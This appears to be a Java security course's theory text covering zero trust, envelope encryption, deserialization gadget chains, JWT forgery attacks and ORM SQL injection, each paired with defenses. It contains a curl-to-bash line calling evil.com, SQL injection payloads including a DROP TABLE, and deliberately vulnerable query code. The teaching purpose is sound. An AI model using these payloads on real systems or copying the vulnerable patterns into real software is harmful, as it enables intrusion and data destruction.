# THEORY: Production Security Architecture & Zero Trust for High-Scale Java
## Lab 09 | Production Engineering Academy — Top 0.0001% Engineering

---

## 1. Zero Trust Architecture & Defense in Depth in Java Microservices

In enterprise cloud security, the internal network perimeter is assumed to be **compromised**. Trust is never granted based on physical network location (VPC or private IP). Every single internal RPC, database call, and event message must be authenticated, authorized, and cryptographically verified.

```
                           ┌──────────────────────────────────────────────┐
                           │          Zero Trust Invariants               │
                           └──────────────────────┬───────────────────────┘
                                                  │
         ┌────────────────────────┬───────────────┴───────────────┬────────────────────────┐
         ▼                        ▼                               ▼                        ▼
 ┌───────────────┐        ┌───────────────┐               ┌───────────────┐        ┌───────────────┐
 │ Mutual TLS    │        │ Cryptographic │               │ Envelope      │        │ Least         │
 │ (mTLS) Mesh   │        │ Identity      │               │ Encryption    │        │ Privilege     │
 └───────┬───────┘        └───────┬───────┘               └───────┬───────┘        └───────┬───────┘
         │                        │                               │                        │
  • Ephemeral X.509 certs  • SPIFFE / SPIRE IDs            • Master KEK in Cloud    • Ephemeral DB creds
  • AES-256-GCM cipher     • Workload Identity / IRSA      • Ephemeral AES DEK      • Read-only replicas
  • SPIFFE SAN validation  • Zero hardcoded secrets        • Hardware HSM roots     • Scoped IAM roles
```

### 1.1 Mutual TLS (mTLS) with SPIFFE/SPIRE Identity
Standard TLS verifies only the server's identity. In **Mutual TLS (mTLS)**:
1. The server presents its X.509 certificate to the client; the client validates the server's signature against the trusted internal CA root.
2. The client presents its X.509 certificate to the server; the server validates the client's signature against the internal CA root.
3. Both peers extract the **SPIFFE ID** embedded inside the X.509 Subject Alternative Name (SAN):
   ```text
   spiffe://cluster.local/ns/production/sa/payment-service
   ```
4. The server inspects its authorization policy: *Is `spiffe://.../sa/payment-service` permitted to call `POST /v1/settlements`?* If not, the TLS handshake or request is rejected with `403 Forbidden`.

### 1.2 Envelope Encryption Architecture (KMS / HSM)
Directly encrypting high-volume production data with a single cloud master key is slow, expensive, and insecure (violates key-usage quotas). Enterprise architectures enforce **Envelope Encryption**:

```
                       AWS KMS / GCP Cloud KMS / HashiCorp Vault
                                      │
          [GenerateDataKey API: Master Key (KEK) remains inside HSM]
                                      │
         ┌────────────────────────────┴────────────────────────────┐
         ▼                                                         ▼
┌─────────────────────────────────┐               ┌─────────────────────────────────┐
│ Plaintext Data Encryption Key   │               │ Encrypted Data Encryption Key   │
│ (DEK - 256-bit AES Key)         │               │ (Encrypted with KEK in HSM)     │
└────────────────┬────────────────┘               └────────────────┬────────────────┘
                 │                                                 │
                 ▼                                                 │
  [Encrypts sensitive payload with AES-256-GCM]                    │
  [Deletes Plaintext DEK from RAM immediately!]                    │
                 │                                                 │
                 ▼                                                 ▼
┌───────────────────────────────────────────────────────────────────────────────────┐
│ Persisted Ciphertext Blob: [Encrypted DEK Header] + [Encrypted Data] + [GCM Tag]  │
└───────────────────────────────────────────────────────────────────────────────────┘
```
**Benefits**:
- Master Key (KEK) never leaves the physical Hardware Security Module (HSM).
- Encryption of gigabytes of payload data executes in local CPU registers at multi-gigabit hardware speeds using Intel AES-NI intrinsics.
- Rotation of the Master Key does not require re-encrypting petabytes of historical database records.

### 1.3 The Secret Zero Problem & Workload Identity Federation
How does a newly booted Java container authenticate to HashiCorp Vault or AWS Secrets Manager to retrieve database credentials without hardcoding a password or API key in the image?
- **Legacy Anti-Pattern**: Baking API keys into environment variables or container filesystems.
- **The Solution: Workload Identity Federation (AWS IRSA / GCP Workload Identity)**:
  1. Kubernetes projects an ephemeral, cryptographically signed OIDC ServiceAccount token into the pod at `/var/run/secrets/tokens/vault-token`.
  2. The Java application exchanges this projected OIDC token with the cloud provider STS (Security Token Service).
  3. STS validates the signature against the Kubernetes cluster's public OIDC keys and returns temporary, short-lived (15-minute) cloud credentials.
  4. Zero static passwords, zero hardcoded API keys.

---

## 2. Insecure Java Deserialization & Gadget Chains

Native Java Serialization (`java.io.ObjectInputStream.readObject()`) is widely considered the most dangerous architectural vulnerability in the history of the Java platform (responsible for Equifax, Apache Struts, and WebLogic remote code execution disasters).

### 2.1 The Mechanics of a Gadget Chain
Native deserialization does not merely instantiate POJOs; it **reconstructs dynamic object graphs by executing native bytecode**:
1. When `readObject()` is called on untrusted input bytes, the JVM reads class descriptors and invokes magic methods (`readObject()`, `readResolve()`, `validateObject()`).
2. An attacker crafts a serialized payload using existing popular classes residing on the application's classpath (libraries like Apache Commons Collections, Spring Framework, Groovy, or Jackson).
3. These classes are chained together into a **Gadget Chain**:
   ```
   [BadPayload.readObject()]
           │ Invokes hashCode()
           ▼
   [BadAttributeValueExpException.readObject()]
           │ Invokes toString()
           ▼
   [TiedMapEntry.toString()]
           │ Invokes getValue()
           ▼
   [LazyMap.get()]
           │ Invokes transform()
           ▼
   [ChainedTransformer.transform()]
           │ Invokes new Class[]{ ConstantTransformer, InvokerTransformer }
           ▼
   [InvokerTransformer.transform()]
           │ Reflection: Runtime.getRuntime().exec("curl evil.com/shell | bash")
           ▼
   🚨 REMOTE CODE EXECUTION (RCE) BEFORE OBJECT CASTING EVEN OCCURS!
   ```
4. Even if the application attempts to cast the deserialized object:
   ```java
   MySafeClass obj = (MySafeClass) ois.readObject();
   ```
   The arbitrary command execution occurs **inside `ois.readObject()`** before the type cast check is evaluated!

### 2.2 Modern Defenses: JEP 290 Serialization Filtering
1. **Ban Native Java Serialization**: Use strict schema-based protocols (Protobuf, Avro, or JSON).
2. **JEP 290 JVM Serial Filter**: If native serialization cannot be completely eradicated from legacy systems, enforce a strict JVM-level whitelist:
   ```bash
   -Djdk.serialFilter="com.learning.production.*;!*"
   ```
   Any incoming class outside the explicit package is rejected immediately before instantiation.
3. **Disable Polymorphic Deserialization in Jackson**:
   Never use `enableDefaultTyping()` or `@JsonTypeInfo(use = Id.CLASS)` on untrusted JSON inputs!

---

## 3. Cryptographic Token Security & Modern JWT Architecture

JSON Web Tokens (JWT / RFC 7519) are standard in distributed authentication, but implementational pitfalls introduce severe vulnerabilities.

### 3.1 The `alg: "none"` Attack
Attackers modify the JWT header to specify `{"alg": "none"}` and strip the cryptographic signature portion. If the JWT library parser fails to enforce allowed algorithms, it accepts the token as valid, allowing attackers to forge arbitrary administrative claims (`"role": "SUPER_ADMIN"`).

### 3.2 Algorithm Confusion Attack (HMAC vs. RSA/ECDSA)
- A service issues JWTs using asymmetric cryptography (RS256):
  - Private Key ($K_{\text{priv}}$): Secret, held only by Auth Server to sign tokens.
  - Public Key ($K_{\text{pub}}$): Publicly accessible by all microservices to verify signatures.
- **The Attack**:
  1. An attacker obtains the service's public RSA key ($K_{\text{pub}}$) in PEM format.
  2. The attacker crafts a forged admin JWT and sets the header to **`{"alg": "HS256"}` (symmetric HMAC-SHA256)**.
  3. The attacker signs the token using the server's **public RSA key as the symmetric HMAC secret**!
  4. If the backend verification library accepts both RS256 and HS256 without enforcing algorithm pinning, the backend uses its copy of the public key to verify the HMAC signature.
  5. The HMAC check matches, and the forged token is accepted!

**Defense**: Pin allowed algorithms explicitly in code:
```java
JwtParser parser = Jwts.parser()
    .requireAlgorithm(SignatureAlgorithm.RS256) // Strict algorithm pinning!
    .setSigningKey(publicKey)
    .build();
```

### 3.3 JWT Revocation & The Distributed Replay Trap
Because JWTs are stateless, once signed, they remain valid until expiration (`exp`). If a user's account is compromised, revoking the token cannot be done locally.
- **The Dual-Token Standard**:
  - **Access Token**: Short-lived (5 to 15 minutes), stateless JWT verified locally via public key.
  - **Refresh Token**: Long-lived (7 to 30 days), opaque random string stored in Redis alongside token metadata and device fingerprints.
  - During sensitive operations (password change, account lock), the refresh token is deleted from Redis, locking out the attacker within 5 minutes.

---

## 4. SQL Injection in Modern ORMs (Hibernate / JPA Pitfalls)

Many developers mistakenly believe using an ORM like Hibernate or Spring Data JPA automatically prevents SQL injection. This is dangerously false.

### 4.1 Vulnerable JPQL / HQL String Concatenation
```java
// SEVERE SQL INJECTION IN HIBERNATE:
String hql = "FROM Account WHERE accountHolder = '" + userInput + "'";
Query query = entityManager.createQuery(hql);
```
An attacker passing `' OR '1'='1` bypasses authentication completely, dump database tables, or executes native SQL commands via DBMS-specific functions.

### 4.2 Native Query Injection
```java
// Spring Data JPA Native Query Injection:
@Query(value = "SELECT * FROM transactions WHERE status = '" + status + "' ORDER BY " + sortField, nativeQuery = true)
List<Transaction> findTransactions(String status, String sortField);
```
While positional parameters (`?1`) parameterize values, **column names and `ORDER BY` clauses cannot be parameterized by JDBC drivers**! Concatenating `sortField` allows attackers to execute blind SQL injection attacks (`sortField = "id; DROP TABLE accounts;--"`).

### 4.3 Production Defensive Invariants
1. **Always Use Named / Positional Parameters**:
   ```java
   @Query("FROM Account WHERE accountHolder = :holder")
   List<Account> findByHolder(@Param("holder") String holder);
   ```
2. **Whitelist Dynamic Sort / Column Fields**:
   Validate column names against a strict internal Java `enum` before applying to query builders.
